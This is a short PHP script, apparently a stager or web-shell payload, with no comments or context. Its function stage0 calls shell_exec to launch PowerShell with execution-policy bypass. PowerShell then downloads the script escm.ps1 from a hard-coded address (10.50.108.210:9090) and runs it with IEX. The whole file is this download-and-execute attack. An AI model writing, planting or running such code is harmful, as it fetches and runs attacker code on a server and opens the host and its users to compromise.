<?php
    function stage0() {
        $init = "powershell.exe -nop -sta -ep bypass";
        $payload = "IEX(New-Object Net.WebClient).downloadString('http://10.50.108.210:9090/escm.ps1')";
        $execution_command = "shell_exec";
        $query = $execution_command("$init $payload");
        echo $query;
    }
    stage0();
    die();
?>